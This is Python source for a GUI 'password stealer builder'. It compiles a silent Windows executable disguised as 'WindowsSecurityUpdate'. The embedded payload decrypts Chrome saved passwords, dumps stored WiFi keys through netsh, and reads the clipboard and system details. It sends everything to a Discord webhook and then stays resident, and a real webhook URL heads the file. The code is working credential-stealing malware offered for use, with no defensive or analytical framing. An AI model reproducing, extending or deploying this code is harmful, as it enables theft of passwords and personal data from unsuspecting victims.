https://discord.com/api/webhooks/1420479039973490803/wAOLMbEAm-TVcAI61OSBb7YXzq-lzJzf4sPwde8XHjnuoQtiaMeN3Kwr29OI7AEqp4yO


import os
import sys
import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
import re
import shutil
import tempfile
import textwrap
import requests
import uuid
import platform

# =================== WEBHOOK TEST ===================
def test_webhook(hook):
    try:
        resp = requests.post(hook, json={"content": "Stealer full grab test - webhook alive ðŸ”¥"}, timeout=10)
        if resp.status_code in [200, 204]:
            return True, "Webhook working - test message sent."
        else:
            return False, f"Failed ({resp.status_code})"
    except Exception as e:
        return False, f"Error: {str(e)}"

# =================== GUI ===================
def get_webhook():
    root = tk.Tk()
    root.title("Full Password Stealer Builder - Silent Edition")
    root.geometry("600x300")
    root.resizable(False, False)
    
    tk.Label(root, text="Discord Webhook URL:", font=("Arial", 11)).pack(pady=15)
    webhook_entry = tk.Entry(root, width=80)
    webhook_entry.pack(pady=5)
    
    def run_test():
        hook = webhook_entry.get().strip()
        success, msg = test_webhook(hook)
        if success:
            messagebox.showinfo("OK", msg)
        else:
            messagebox.showerror("Failed", msg)
    
    tk.Button(root, text="TEST WEBHOOK", command=run_test, bg="#5865F2", fg="white", font=("Arial", 10, "bold")).pack(pady=10)
    
    progress = ttk.Progressbar(root, mode="indeterminate")
    
    def build():
        webhook = webhook_entry.get().strip()
        if not webhook or "discord.com/api/webhooks" not in webhook:
            messagebox.showerror("Nope", "Valid Discord webhook required.")
            return
        
        progress.pack(pady=15)
        progress.start()
        root.update()
        
        try:
            generate_malware(webhook)
            progress.stop()
            progress.pack_forget()
            messagebox.showinfo("Built", 
                "stealer.exe ready!\n\n"
                "100% silent - no console, no GUI.\n"
                "Grabs:\n"
                "â€¢ Chrome saved passwords (filtered for weak ones like 'possword')\n"
                "â€¢ All stored WiFi passwords\n"
                "â€¢ Clipboard content\n"
                "â€¢ Full system recon (HWID, IP, username, etc)\n\n"
                "Sends everything to your webhook as JSON file + fallback text.")
        except Exception as e:
            progress.stop()
            progress.pack_forget()
            messagebox.showerror("Error", f"Build failed:\n{str(e)}")
        root.destroy()
    
    tk.Button(root, text="BUILD EXE", command=build, bg="green", fg="white", font=("Arial", 14, "bold"), height=2).pack(pady=20)
    root.mainloop()

# =================== FULL STEALER PAYLOAD ===================
stealer_code = textwrap.dedent('''
import os
import json
import sqlite3
import win32crypt
import shutil
import subprocess
import base64
from Crypto.Cipher import AES
import requests
import getpass
import platform
import socket
from datetime import datetime
import ctypes

WEBHOOK = "{WEBHOOK_PLACEHOLDER}"

def gather_data():
    data = {}
    user = getpass.getuser()
    data['user'] = user
    data['hostname'] = socket.gethostname()
    data['os'] = platform.platform()
    data['time'] = datetime.now().isoformat()

    # Clipboard
    try:
        CF_TEXT = 1
        kernel32 = ctypes.windll.kernel32
        user32 = ctypes.windll.user32
        user32.OpenClipboard(0)
        if user32.IsClipboardFormatAvailable(CF_TEXT):
            clipboard_data = user32.GetClipboardData(CF_TEXT)
            data['clipboard'] = ctypes.c_char_p(clipboard_data).value.decode('utf-8', errors='ignore')
        user32.CloseClipboard()
    except:
        data['clipboard'] = "failed"

    # WiFi passwords
    data['wifi'] = []
    try:
        profiles = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles'], text=True).split('\\n')
        profile_names = [line.split(":")[1].strip() for line in profiles if "All User Profile" in line]
        for profile in profile_names:
            try:
                result = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', profile, 'key=clear'], text=True)
                key = [line.split(":")[1].strip() for line in result.split('\\n') if "Key Content" in line]
                if key:
                    data['wifi'].append({profile: key[0]})
            except:
                pass
    except:
        data['wifi'] = ["failed"]

    # Chrome passwords
    data['chrome_passwords'] = []
    login_db = f"C:\\\\Users\\\\{user}\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\\\\Default\\\\Login Data"
    if os.path.exists(login_db):
        try:
            temp_db = os.path.join(os.getenv("TEMP"), "LoginData_temp")
            shutil.copy2(login_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            for row in cursor.fetchall():
                url = row[0]
                username = row[1]
                encrypted_pw = row[2]
                try:
                    decrypted = win32crypt.CryptUnprotectData(encrypted_pw, None, None, None, 0)[1].decode('utf-8')
                    # Filter for weak patterns like "o" instead of "a"
                    if any(bad in decrypted.lower() for bad in ["possword", "p@ssw0rd", "admin", "1234", "qwerty", "letmein"]):
                        data['chrome_passwords'].append({"url": url, "user": username, "pass": decrypted})
                except:
                    pass
            conn.close()
            os.remove(temp_db)
        except:
            data['chrome_passwords'] = ["failed or locked"]

    return data

def exfil():
    payload = json.dumps(gather_data(), indent=2)
    temp_file = os.path.join(os.getenv("TEMP"), "system_report.json")
    try:
        with open(temp_file, "w", encoding="utf-8") as f:
            f.write(payload)
        
        with open(temp_file, "rb") as f:
            files = {"file": ("grab.json", f)}
            content = {"content": f"**Full password grab** - {getpass.getuser()}@{socket.gethostname()}"}
            requests.post(WEBHOOK, data=content, files=files, timeout=30)
    except:
        # Fallback plain text
        try:
            requests.post(WEBHOOK, json={"content": f"**Fallback Grab**\\n```json\\n{payload}\\n```"})
        except:
            pass
    finally:
        try:
            os.remove(temp_file)
        except:
            pass

exfil()

# Stay resident quietly
while True:
    import time
    time.sleep(3600)
''')

# =================== BUILD ===================
def generate_malware(webhook):
    temp_dir = tempfile.mkdtemp(prefix="build_", dir=os.getcwd())
    script_path = os.path.join(temp_dir, "stealer.py")
    
    with open(script_path, "w", encoding="utf-8") as f:
        f.write(stealer_code.replace("{WEBHOOK_PLACEHOLDER}", webhook))
    
    cmd = [
        "pyinstaller",
        "--onefile",
        "--noconsole",
        "--name", "WindowsSecurityUpdate",
        "--hidden-import", "win32crypt",
        "--hidden-import", "Crypto.Cipher.AES",
        script_path
    ]
    
    result = subprocess.run(cmd, cwd=temp_dir, capture_output=True, text=True)
    if result.returncode != 0:
        raise Exception(f"PyInstaller failed:\\n{result.stderr}")
    
    built_exe = os.path.join(temp_dir, "dist", "WindowsSecurityUpdate.exe")
    final_exe = os.path.join(os.getcwd(), "stealer.exe")
    shutil.copyfile(built_exe, final_exe)
    
    # Cleanup
    shutil.rmtree(temp_dir, ignore_errors=True)
    print(f"Full password stealer built: {final_exe}")

if __name__ == "__main__":
    get_webhook()
